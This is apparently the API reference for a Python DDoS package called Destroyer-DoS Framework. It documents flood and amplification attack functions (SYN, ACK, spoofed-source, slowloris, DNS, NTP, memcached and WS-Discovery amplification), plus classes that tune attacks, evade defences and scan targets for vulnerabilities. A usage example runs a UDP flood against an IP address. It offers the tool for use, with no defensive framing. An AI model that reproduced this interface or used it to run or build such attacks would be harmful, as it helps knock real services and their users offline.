# API Reference

Python API documentation for Destroyer-DoS Framework.

## Core Classes

### AttackStats

Tracks attack statistics.

```python
from ddos import AttackStats

stats = AttackStats()
stats.increment(packets=100, bytes_count=102400, attack_type='UDP')
report = stats.report()
```

**Methods:**

| Method                                         | Description               |
| ---------------------------------------------- | ------------------------- |
| `increment(packets, bytes_count, attack_type)` | Add to counters           |
| `record_error(count)`                          | Record errors             |
| `report()`                                     | Get statistics dictionary |
| `adjust_rate(success)`                         | Adjust packet rate        |

**Report Fields:**

| Field          | Type  | Description         |
| -------------- | ----- | ------------------- |
| `duration`     | float | Elapsed seconds     |
| `packets_sent` | int   | Total packets       |
| `bytes_sent`   | int   | Total bytes         |
| `errors`       | int   | Error count         |
| `pps`          | int   | Packets per second  |
| `mbps`         | float | Megabits per second |
| `gbps`         | float | Gigabits per second |
| `error_rate`   | float | Error percentage    |

### AIOptimizer

Optimizes attack parameters.

```python
from ddos import AIOptimizer

optimizer = AIOptimizer()
params = optimizer.optimize_attack_pattern(current_stats)
```

**Methods:**

| Method                                                  | Description              |
| ------------------------------------------------------- | ------------------------ |
| `optimize_attack_pattern(stats)`                        | Get optimized parameters |
| `optimize_with_ai(params, stats, response, conditions)` | Full optimization        |
| `predict_effectiveness(target, params)`                 | Predict success rate     |
| `detect_defenses(history)`                              | Detect target defenses   |

### TargetAnalyzer

Analyzes target systems.

```python
from ddos import TargetAnalyzer

analyzer = TargetAnalyzer()
info = analyzer.resolve(target)
profile = analyzer.profile(target)
```

**Methods:**

| Method                         | Description                |
| ------------------------------ | -------------------------- |
| `resolve(target)`              | Resolve target information |
| `profile(target)`              | Profile target defenses    |
| `scan_vulnerabilities(target)` | Scan for vulnerabilities   |

### PerformanceOptimizer

Optimizes system performance.

```python
from ddos import PerformanceOptimizer

optimizer = PerformanceOptimizer()
optimizer.optimize_system()
buffer = optimizer.get_buffer(size)
```

**Methods:**

| Method              | Description                |
| ------------------- | -------------------------- |
| `optimize_system()` | Apply system optimizations |
| `get_buffer(size)`  | Get optimized buffer       |

### PlatformManager

Manages platform-specific operations.

```python
from ddos import PlatformManager

manager = PlatformManager()
config = manager.get_optimal_config()
sock = manager.create_socket('UDP')
```

**Methods:**

| Method                    | Description                   |
| ------------------------- | ----------------------------- |
| `get_optimal_config()`    | Get platform-optimal settings |
| `create_socket(protocol)` | Create optimized socket       |

## Attack Functions

### tcp_flood

```python
await tcp_flood(target, port, packet_size=1024, spoof_source=False)
```

### udp_flood

```python
await udp_flood(target, port, packet_size=1472, spoof_source=False)
```

### http_flood

```python
await http_flood(target, port, use_ssl=False)
```

### dns_amplification

```python
await dns_amplification(target)
```

### icmp_flood

```python
await icmp_flood(target)
```

### slowloris

```python
await slowloris(target, port)
```

### tcp_syn_flood

```python
await tcp_syn_flood(target, port, packet_size=60)
```

### tcp_ack_flood

```python
await tcp_ack_flood(target, port, packet_size=60)
```

### push_ack_flood

```python
await push_ack_flood(target, port, packet_size=1024)
```

### syn_spoof_flood

```python
await syn_spoof_flood(target, port, packet_size=60)
```

### ntp_amplification

```python
await ntp_amplification(target, port=123)
```

### memcached_amplification

```python
await memcached_amplification(target, port=11211)
```

### ws_discovery_amplification

```python
await ws_discovery_amplification(target, port=3702)
```

### quantum_flood

```python
await quantum_flood(target, port, packet_size=1024)
```

## Main Function

### run_attack

```python
await run_attack(target, port, protocol, duration, threads, packet_size)
```

**Parameters:**

| Parameter   | Type | Description           |
| ----------- | ---- | --------------------- |
| target      | str  | Target IP or hostname |
| port        | int  | Target port           |
| protocol    | str  | Attack protocol       |
| duration    | int  | Duration in seconds   |
| threads     | int  | Worker count          |
| packet_size | int  | Packet size in bytes  |

## Constants

```python
# Buffer sizes
SOCK_BUFFER_SIZE = 128 * 1024 * 1024  # Windows
SOCK_BUFFER_SIZE = 256 * 1024 * 1024  # Linux

# Packet sizes
MAX_UDP_PACKET_SIZE = 1472
MAX_TCP_PACKET_SIZE = 1460

# Rate limits
MAX_CONCURRENT_WORKERS = 100  # Windows
MAX_CONCURRENT_WORKERS = 1000  # Linux

# Supported protocols
ALL_PROTOCOLS = [
    'TCP', 'UDP', 'HTTP', 'HTTPS', 'DNS', 'ICMP', 'SLOW',
    'QUANTUM', 'TCP-SYN', 'TCP-ACK', 'PUSH-ACK',
    'WS-DISCOVERY', 'MEMCACHED', 'SYN-SPOOF', 'NTP'
]
```

## Usage Example

```python
import asyncio
from ddos import run_attack, AttackStats

async def main():
    await run_attack(
        target='192.168.1.100',
        port=80,
        protocol='UDP',
        duration=60,
        threads=32,
        packet_size=1472
    )

if __name__ == '__main__':
    asyncio.run(main())
```
